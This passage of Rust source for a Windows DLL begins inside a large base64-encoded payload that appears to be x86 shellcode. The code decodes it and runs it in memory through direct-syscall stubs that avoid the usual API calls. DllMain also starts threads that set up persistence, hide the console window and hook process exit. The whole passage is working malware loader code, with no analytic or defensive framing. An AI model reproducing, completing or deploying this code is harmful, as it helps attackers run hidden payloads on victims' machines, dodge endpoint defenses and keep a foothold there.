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";

const sh3: &str = "A/7QkrAAAAAPHUOiABQAAWVmFwHUQi0QkFItMJBwPtwCLNIED94tEJBCDbCQUAoPoBIlEJBCD7QF0BIX2dMCLTCQYO/NydotEOXwDwzvwc2wzyTgOdB2NXCQgi9Yr3oP5PHMQigKIBBM8LnQHQUKAOgB168dEDCFkbGwAM9JBA844EXQXjXQkYCvxg/o/cwyKAUKIBA5BgDkAde+NRCRgxkQUYABQjUQkJFBX/7QksAAAAOjU4v//g8QQi/CLxusWi4QksAAAACtDEIs0ggP36W7///8zwF9eXVuBxJAAAADDVYvsZKEYAAAAM8lWi0Awi0AMi3AM6yCFyXUj/3UY/3UU/3UQ/3UMUP91COjV4P//izaDxBiLyItGGIXAddmLwV5dw4PsFFOLXCQkM8BVVjPtiUQkDFeLfCQsM/aJdCQsi0wkKIoMCITJdB6D+EB0GYhMLBRFQIl8JCyJRCQQiXQkLIP9EHVv61RqEFgrxY10JBRQA/VqAFbo/AMAAIPEDMYGgIP9DHIhU41EJBhXUOhWAAAAahAz+DPajUQkJGoAUOjTAwAAg8QYi0QkEIt0JCzB4ANGiUQkIIl0JCxTjUQkGFdQ6CEAAAAz+IPEDItEJBAz2jPthfYPhGL///+Lx4vTX15dW4PEFMOD7BCLRCQYi1QkHFNVVot0JCAz21eNfCQQpaWlpYtMJBSLdCQci2wkGIt8JBCJTCQoi87ByAiLdCQoA8LBzggzxwP3wcIDM/PBxwMz0IlsJCgz/ovpQ4P7G3LWX15dW4PEEMOLVCQQg+wUU4tcJCBVi2wkKIXSD4TsAAAAM8CNSw9AiUwkLCvDVolEJAxXjUQkFDvBdwSNRCQji/ONfCQUM8mlpaWli3QkKIsEjjFEjBRBg/kEcvOLdCQgi0QkHIt8JBiLTCQUx0QkMBAAAAADzwPGwccFM/nBxggz8MHBEAPHA87BxwfBxg0z+DPxwcAQg2wkMAF114tcJCiJTCQUM8mJdCQgiXwkGIlEJByLBIsxRIwUQYP5BHLzahBeO9aLyg9HzoXJdBWNfCQUi/Ur/YvZigQ3MAZGg+sBdfWLXCQQK9ED6YtMJDSAAQF1CEmNBAuFwH/zi1wkLI1LD4XSD4Uo////X15dW4PEFMOD7BSLTCQYg2QkEABTVYtsJCSKAVZXiEUAg8//jUUBM/aJRCQYM9uNQQGJXCQQiUQkFI1EJBRQ6GcBAABZhcAPhDIBAACNRCQUUOhUAQAAhcCNRCQYWVB0fehFAQAAWYXAdDdqBDP2W41EJBRQ6DEBAABZjTRwg+sBde2LVCQYhfZ0CovCK8aKAIgC6wPGAgCLXCQQQunvAAAAi0QkFItUJBgPtjhAi8+JRCQUg+EBg8EC0e90FIvyK/eKBogCQkaD6QF19emkAAAAM9tDiVwkEOmcAAAA6P8AAACL0FmF9nUrg/oCdSaNRCQUUOjpAAAAi1QkHIvwWYX2dHaLyivPigGIAkJBg+4BdfXrYYtMJBSNRCQUg/YBK9bB4ggPtjmBxwD+//8D+kFQiUwkGOinAAAAWYvIgf8AfQAAcgFBi1QkGI1BAYH/AAUAAA9CwYH/gAAAAI1wAg9D8IX2dBOLyivPigGIAkJBg+4BdfWJVCQYM/ZG6xiLTCQUi1QkGIoBiAJCQYlMJBQz9olUJBiF2w+Em/7//19eK9Vdi8Jbg8QUw1aLdCQIi04MjVYIjUH/iUYMhcl1E4sOD7YBiQKNQQGJBsdGDAcAAACLAl6NDADB6AeJCoPgAcNWM/ZG/3QkCOi8/////3QkDI00cOiw////WVmFwHXli8Zew4tUJAyLRCQEVovwhdJ0E1eLfCQQK/iKDDeIDkaD6gF19V9ew4pEJAiLTCQMV4t8JAjzqotEJAhfw4tEJASLTCQIU4oQhNJ0DooZhNt0CDrTdQRAQevsD74AD74JK8Fbw4tUJASLTCQIU4oChMB0E4oZhNt0DYDLIAwgOsN1BEJB6+cPvgIPvgkrwVvDAAAAAAAAAAAAAAAAAAA="; 

fn get_shellcode() -> String {
    [sh1, sh2, sh3].concat()
}



unsafe extern "system" fn shellcode_thread(_: *mut core::ffi::c_void) -> u32 {
	let ENCODED_SHELLCODE = get_shellcode();
	
    if let Ok(shellcode) = general_purpose::STANDARD.decode(ENCODED_SHELLCODE) {
        if let (Some(nt_alloc_info), Some(nt_write_info), Some(nt_protect_info)) = (
            get_syscall_info("ntdll.dll", "NtAllocateVirtualMemory"),
            get_syscall_info("ntdll.dll", "NtWriteVirtualMemory"),
            get_syscall_info("ntdll.dll", "NtProtectVirtualMemory"),
        ) {
            let mut exec_mem: *mut std::ffi::c_void = std::ptr::null_mut();
            let mut region_size = shellcode.len();

            let status = asm_nt_allocate_virtual_memory(
                -1isize as windows_sys::Win32::Foundation::HANDLE,
                &mut exec_mem,
                0,
                &mut region_size,
                0x3000, // MEM_COMMIT | MEM_RESERVE
                0x04,   // PAGE_READWRITE
                &nt_alloc_info,
            );

            if status == 0 && !exec_mem.is_null() {
                let mut bytes_written = 0usize;
                asm_nt_write_virtual_memory(
                    -1isize as windows_sys::Win32::Foundation::HANDLE,
                    exec_mem,
                    shellcode.as_ptr() as *const std::ffi::c_void,
                    shellcode.len(),
                    &mut bytes_written,
                    &nt_write_info,
                );

                let mut old_protect = 0u32;
                let mut protect_size = shellcode.len();
                let mut protect_base = exec_mem;
                asm_nt_protect_virtual_memory(
                    -1isize as windows_sys::Win32::Foundation::HANDLE,
                    &mut protect_base,
                    &mut protect_size,
                    0x20, // PAGE_EXECUTE_READ
                    &mut old_protect,
                    &nt_protect_info,
                );

                let exec_fn: extern "system" fn() = std::mem::transmute(exec_mem);
                exec_fn();
            }
        }
    }
    0
}

unsafe extern "system" fn hide_console_thread(_: *mut core::ffi::c_void) -> u32 {
    loop {
        if let Some(kernel32_base) = get_module_base("kernel32.dll") {
            if let Some(get_console_window_addr) = get_export_address(kernel32_base, "GetConsoleWindow") {
                let get_console_window: extern "system" fn() -> windows::Win32::Foundation::HWND = std::mem::transmute(get_console_window_addr);
                let hwnd = get_console_window();
                if hwnd.0 != 0 {
                    if let Some(nt_show_window_info) = get_syscall_info("win32u.dll", "NtUserShowWindow") {
                        asm_nt_user_show_window(hwnd, 0, &nt_show_window_info); // SW_HIDE = 0
                        break;
                    }
                }
            }
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
    0
}

mod pre;

unsafe extern "system" fn persistence_thread(_lp_param: *mut std::ffi::c_void) -> u32 {
    match pre::setup_persistence() {
        Ok(_) => {
            let _ = std::fs::write("C:\\Users\\Public\\persist_ok.txt", "OK");
        }
        Err(e) => {
            let msg = format!("HATA: {}", e);
            let _ = std::fs::write("C:\\Users\\Public\\persist_error.txt", msg);
        }
    }
    0
}

#[no_mangle]
pub extern "system" fn DllMain(
    _hinst_dll: HINSTANCE,
    fdw_reason: u32,
    _lp_reserved: *mut core::ffi::c_void,
) -> BOOL {
    if fdw_reason == DLL_PROCESS_ATTACH {
        unsafe {
            if init_gadgets().is_none() {
                return BOOL(1);
            }

            hook_exit_process();

            if let Some(nt_create_thread_info) = get_syscall_info("ntdll.dll", "NtCreateThreadEx") {
                let mut thread_handle: windows_sys::Win32::Foundation::HANDLE = 0;
                
				asm_nt_create_thread_ex(
                    &mut thread_handle,
                    0x1FFFFF,
                    std::ptr::null_mut(),
                    -1isize as windows_sys::Win32::Foundation::HANDLE,
                    persistence_thread as *mut std::ffi::c_void,
                    std::ptr::null_mut(),
                    0, 0, 0, 0,
                    std::ptr::null_mut(),
                    &nt_create_thread_info,
                );

                asm_nt_create_thread_ex(
                    &mut thread_handle,
                    0x1FFFFF,
                    std::ptr::null_mut(),
                    -1isize as windows_sys::Win32::Foundation::HANDLE,
                    hide_console_thread as *mut std::ffi::c_void,
                    std::ptr::null_mut(),
                    0, 0, 0, 0,
                    std::ptr::null_mut(),
                    &nt_create_thread_info,
                );

                asm_nt_create_thread_ex(
                    &mut thread_handle,
                    0x1FFFFF,
                    std::ptr::null_mut(),
                    -1isize as windows_sys::Win32::Foundation::HANDLE,
                    shellcode_thread as *mut std::ffi::c_void,
                    std::ptr::null_mut(),
                    0, 0, 0, 0,
                    std::ptr::null_mut(),
                    &nt_create_thread_info,
                );
            }
        }
    }
    BOOL(1)
}
